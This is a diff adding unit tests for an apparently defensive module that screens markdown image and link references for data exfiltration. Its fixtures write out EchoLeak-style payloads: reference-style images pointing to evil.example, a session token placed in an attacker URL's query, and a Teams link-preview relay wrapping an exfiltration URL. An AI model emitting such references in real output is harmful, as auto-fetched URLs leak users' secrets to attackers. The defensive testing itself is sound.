@@ -1,0 +1,229 @@
+"""Unit tests for gov.egress_refs (wave-273 lane I).
+
+Tests at the public seams: extract_egress_refs, screen_egress_refs,
+EgressPolicy, MarkdownAutoFetchChannel. Expected values are worked
+examples (EchoLeak-shaped fixtures), never recomputed from the code.
+"""
+
+import hashlib
+import os
+import re
+import sys
+import unittest
+import urllib.parse
+
+_HERE = os.path.dirname(os.path.abspath(__file__))
+_REPO = os.path.dirname(_HERE)
+if _REPO not in sys.path:
+    sys.path.insert(0, _REPO)
+
+from gov import decision_codes  # noqa: E402
+from gov import egress_refs as er  # noqa: E402
+
+# Wave-273 merge: pin 1443 -> 1458 (+15 codes: 1 sandbox-* + 10
+# bundle-delivery-* + 4 egress-ref-*).
+TAXONOMY_PIN = 1458
+
+EXPECTED_CODES = (
+    "egress-ref-data-exfil",
+    "egress-refs-malformed",
+    "egress-refs-oversized",
+    "egress-relay-exfil",
+)
+
+RELAY = ("teams.microsoft.com", "/urlp/v1/url/content")
+TOKEN = "session-token-9f8e7d6c5b4a"
+
+
+def _policy(**kw):
+    kw.setdefault("trusted_relays", [RELAY])
+    kw.setdefault("allowed_hosts", ("cdn.corp.example",))
+    kw.setdefault("sensitive_digests",
+                   frozenset([hashlib.sha256(TOKEN.encode()).hexdigest()]))
+    return er.EgressPolicy(**kw)
+
+
+class TestCodesRegistered(unittest.TestCase):
+    def test_codes_in_taxonomy(self):
+        for code in EXPECTED_CODES:
+            self.assertIn(code, decision_codes.TAXONOMY)
+
+    def test_pin_from_raw_literals(self):
+        src = open(os.path.join(_REPO, "gov", "decision_codes.py")).read()
+        codes = re.findall(
+            r'"code":\s*[\'"]([a-z][a-z0-9-_.]*)[\'"]', src)
+        self.assertEqual(len(codes), TAXONOMY_PIN)
+        self.assertEqual(len(set(codes)), TAXONOMY_PIN)
+
+    def test_sorted_position(self):
+        src = open(os.path.join(_REPO, "gov", "decision_codes.py")).read()
+        codes = re.findall(
+            r"^    '([a-z][a-z0-9_.-]*)': \{$", src, re.M)
+        self.assertEqual(codes, sorted(codes))
+
+
+class TestExtraction(unittest.TestCase):
+    def test_inline_image(self):
+        rec = er.extract_egress_refs("![a](https://x.example/i.png)")
+        self.assertEqual(rec["verdict"], "ok")
+        self.assertEqual(len(rec["refs"]), 1)
+        r = rec["refs"][0]
+        self.assertEqual(r["kind"], "image-inline")
+        self.assertEqual(r["url"], "https://x.example/i.png")
+        self.assertEqual(r["provenance"], "rendered")
+
+    def test_reference_style_resolves(self):
+        # The EchoLeak redaction-bypass shape.
+        content = "![x][img1]\n\n[img1]: https://evil.example/a.png\n"
+        rec = er.extract_egress_refs(content)
+        self.assertEqual(len(rec["refs"]), 1)
+        r = rec["refs"][0]
+        self.assertEqual(r["kind"], "image-reference")
+        self.assertEqual(r["url"], "https://evil.example/a.png")
+
+    def test_reference_id_case_insensitive(self):
+        content = "[t][AbC]\n\n[abc]: https://evil.example/b.png\n"
+        rec = er.extract_egress_refs(content)
+        self.assertEqual(rec["refs"][0]["url"],
+                         "https://evil.example/b.png")
+
+    def test_html_img(self):
+        rec = er.extract_egress_refs('<img src="https://x.example/a.png">')
+        self.assertEqual(rec["refs"][0]["kind"], "img-html")
+
+    def test_bare_url_is_preview_provenance(self):
+        rec = er.extract_egress_refs("go to https://x.example/p now")
+        self.assertEqual(len(rec["refs"]), 1)
+        r = rec["refs"][0]
+        self.assertEqual(r["kind"], "url-plain")
+        self.assertEqual(r["provenance"], "rendered-preview")
+
+    def test_bytes_input_decoded(self):
+        rec = er.extract_egress_refs(b"[a](https://x.example/)")
+        self.assertEqual(rec["verdict"], "ok")
+        self.assertEqual(len(rec["refs"]), 1)
+
+    def test_no_double_count_of_definition_line(self):
+        # The [id]: url definition line must not itself become a ref.
+        content = "![x][i]\n\n[i]: https://evil.example/a.png\n"
+        rec = er.extract_egress_refs(content)
+        self.assertEqual(len(rec["refs"]), 1)
+
+
+class TestScreening(unittest.TestCase):
+    def test_relay_exfil_refused(self):
+        inner = ("https://evil.example/collect?d="
+                 + "D" * 600)
+        relay = ("https://teams.microsoft.com/urlp/v1/url/content?url="
+                 + urllib.parse.quote(inner, safe=""))
+        rec = er.screen_egress_refs("![x][i]\n\n[i]: " + relay + "\n",
+                                    _policy())
+        self.assertEqual(rec["verdict"], "refuse")
+        self.assertEqual(rec["code"], "egress-relay-exfil")
+
+    def test_relay_digest_through_relay_refused(self):
+        # Regression: a sensitive-digest token in a SHORT clean inner
+        # query must refuse. Digest matching runs on the DECODED inner
+        # target; the outer query is percent-encoded and would glue the
+        # token to %-fragments.
+        inner = "https://evil.example/collect?tok=" + TOKEN
+        relay = ("https://teams.microsoft.com/urlp/v1/url/content?url="
+                 + urllib.parse.quote(inner, safe=""))
+        rec = er.screen_egress_refs("[x](" + relay + ")", _policy())
+        self.assertEqual(rec["verdict"], "refuse")
+        self.assertEqual(rec["code"], "egress-relay-exfil")
+
+    def test_relay_clean_external_inner_allowed(self):
+        inner = "https://news.example/article?id=42"
+        relay = ("https://teams.microsoft.com/urlp/v1/url/content?url="
+                 + urllib.parse.quote(inner, safe=""))
+        rec = er.screen_egress_refs("[n](" + relay + ")", _policy())
+        self.assertEqual(rec["verdict"], "allow")
+
+    def test_sensitive_digest_refused(self):
+        rec = er.screen_egress_refs(
+            "[d](https://evil.example/x?tok=" + TOKEN + ")", _policy())
+        self.assertEqual(rec["verdict"], "refuse")
+        self.assertEqual(rec["code"], "egress-ref-data-exfil")
+
+    def test_oversized_payload_refused(self):
+        rec = er.screen_egress_refs(
+            "![x](https://evil.example/p.png?q=" + "Q" * 600 + ")",
+            _policy())
+        self.assertEqual(rec["verdict"], "refuse")
+        self.assertEqual(rec["code"], "egress-ref-data-exfil")
+
+    def test_allowed_host_exempt(self):
+        rec = er.screen_egress_refs(
+            "![x](https://cdn.corp.example/i.png?" + "v" * 900 + ")",
+            _policy())
+        self.assertEqual(rec["verdict"], "allow")
+
+    def test_relative_ref_allowed(self):
+        rec = er.screen_egress_refs("![x](/static/logo.png)", _policy())
+        self.assertEqual(rec["verdict"], "allow")
+        self.assertEqual(rec["refs"][0]["screen"]["note"], "not-external")
+
+    def test_mailto_allowed(self):
+        rec = er.screen_egress_refs("[m](mailto:a@b.c)", _policy())
+        self.assertEqual(rec["verdict"], "allow")
+
+    def test_first_flagged_code_wins(self):
+        rec = er.screen_egress_refs(
+            "![a](https://evil.example/1.png?q=" + "Q" * 600 + ") "
+            "[b](https://evil.example/2?tok=" + TOKEN + ")",
+            _policy())
+        self.assertEqual(rec["verdict"], "refuse")
+        self.assertEqual(len(rec["flagged"]), 2)
+        self.assertEqual(rec["code"], "egress-ref-data-exfil")
+
+    def test_out_of_scope_on_every_verdict(self):
+        for content in ("plain text",
+                        "![x](https://evil.example/p.png?q=" + "Q" * 600 + ")"):
+            rec = er.screen_egress_refs(content, _policy())
+            self.assertIn("client-performs-fetch", rec["out_of_scope"])
+
+
+class TestNeverRaises(unittest.TestCase):
+    def test_hostile_inputs(self):
+        for bad in (None, 123, ["x"], {"u": 1}, b"\xff\xfe\x00bad",
+                    "![unclosed", "[a](javascript:alert(1))",
+                    "\x00" * 100):
+            for fn in (er.extract_egress_refs, er.screen_egress_refs):
+                rec = fn(bad, _policy())
+                self.assertIn(rec["verdict"], ("ok", "allow", "refuse"))
+
+    def test_oversized_refused(self):
+        rec = er.screen_egress_refs("x" * (2 * 1024 * 1024), _policy())
+        self.assertEqual(rec["verdict"], "refuse")
+        self.assertEqual(rec["code"], "egress-refs-oversized")
+
+    def test_broken_channel_does_not_raise(self):
+        class Boom(er.EgressChannel):
+            channel_kind = "boom"
+
+            def extract_refs(self, content):
+                raise RuntimeError("boom")
+
+        rec = er.extract_egress_refs("![a](https://x.example/)",
+                                     channels=[Boom()])
+        self.assertEqual(rec["verdict"], "ok")
+        self.assertEqual(rec["refs"], [])
+
+
+class TestPolicy(unittest.TestCase):
+    def test_defaults(self):
+        p = er.EgressPolicy()
+        self.assertEqual(p.trusted_relays, ())
+        self.assertEqual(p.allowed_hosts, frozenset())
+        self.assertEqual(p.max_ref_payload_chars, 512)
+
+    def test_relay_normalization(self):
+        p = er.EgressPolicy(trusted_relays=[("Teams.Example.COM",
+                                             "/urlp/")])
+        self.assertEqual(p.trusted_relays, (("teams.example.com",
+                                             "/urlp/"),))
+
+
+if __name__ == "__main__":
+    unittest.main()
